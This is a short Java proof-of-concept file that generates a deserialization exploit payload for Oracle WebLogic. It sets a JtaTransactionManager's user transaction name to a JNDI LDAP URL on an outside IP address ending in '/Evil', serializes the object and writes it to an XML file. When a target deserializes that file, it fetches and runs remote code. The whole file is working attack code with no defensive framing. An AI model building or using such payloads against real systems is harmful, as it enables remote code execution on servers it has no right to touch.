package secondser;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import utils.Util;

import java.io.*;

public class JndiJtaTransactionManager {
    public static void main(String[] args) throws IOException {
        String url = "ldap://101.132.159.30:1389/Evil";
        JtaTransactionManager obj = new JtaTransactionManager();
        obj.setUserTransactionName(url);
        Util.writeFile("./poc2-3.xml", Util.convert(obj));
    }
}